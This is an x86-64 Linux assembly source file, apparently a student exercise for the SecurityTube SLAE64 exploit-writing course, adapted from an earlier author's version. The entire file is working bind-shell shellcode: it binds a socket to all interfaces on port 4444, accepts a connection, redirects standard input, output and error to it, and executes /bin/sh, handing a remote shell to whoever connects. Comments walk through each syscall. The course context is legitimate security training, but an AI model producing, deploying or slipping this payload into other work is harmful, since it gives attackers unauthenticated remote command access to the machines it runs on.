;-------------------------------------------------
; BindShell-adjusted.nasm
; by Michael Born (@blu3gl0w13)
; Student ID: SLAE64-1439
; November 7, 2016
; Original version by: Vivek Ramachandran
; SecurityTube Linux Assembly Expert 64
;-------------------------------------------------

global _start


_start:

	; sock = socket(AF_INET, SOCK_STREAM, 0)
	; AF_INET = 2
	; SOCK_STREAM = 1
	; syscall number 41 

	xor rax, rax
	mov al, 41
	xor rdi, rdi
	mov dil, 2
	xor rsi, rsi
	mov sil, 1
	xor rdx, rdx
	syscall

	; copy socket descriptor to rdi for future use 

	mov rdi, rax


	; server.sin_family = AF_INET 
	; server.sin_port = htons(PORT)
	; server.sin_addr.s_addr = INADDR_ANY
	; bzero(&server.sin_zero, 8)

	xor rax, rax 
	push rax
	mov dword [rsp-4], eax
	mov word [rsp-6], 0x5c11
	mov [rsp - 0xa], eax
	mov byte [rsp-8], 0x2
	sub rsp, 8


	; bind(sock, (struct sockaddr *)&server, sockaddr_len)
	; syscall number 49

	xor rax, rax
	mov al, 49
	mov rsi, rsp
	xor rdx, rdx
	mov dl, 16
	syscall


	; listen(sock, MAX_CLIENTS)
	; syscall number 50

	xor rax, rax
	mov al, 50
	xor rsi, rsi
	mov sil, 2
	syscall


	; new = accept(sock, (struct sockaddr *)&client, &sockaddr_len)
	; syscall number 43

	xor rax, rax
	mov al, 43
	sub rsp, 16
	mov rsi, rsp
        mov byte [rsp-1], 16
        sub rsp, 1
        mov rdx, rsp

        syscall

	; store the client socket description 
	xor r9, r9
	mov r9, rax 

        ; close parent

	xor rax, rax
        mov al, 3
        syscall

        ; duplicate sockets

        ; dup2 (new, old)
        mov rdi, r9
	xor rax, rax
        mov al, 33
        xor rsi, rsi
        syscall

	xor rax, rax
        mov al, 33
	inc rsi
        syscall

	xor rax, rax
        mov al, 33
        inc rsi
        syscall



        ; execve

        ; First NULL push

        xor rax, rax
        push rax

        ; push /bin//sh in reverse

	xor rbx, rbx
        mov rbx, 0x68732f2f6e69622f
        push rbx

        ; store /bin//sh address in RDI

        mov rdi, rsp

        ; Second NULL push
        push rax

        ; set RDX
        mov rdx, rsp


        ; Push address of /bin//sh
        push rdi

        ; set RSI

        mov rsi, rsp

        ; Call the Execve syscall
        add al, 59
        syscall







	






	
	

 
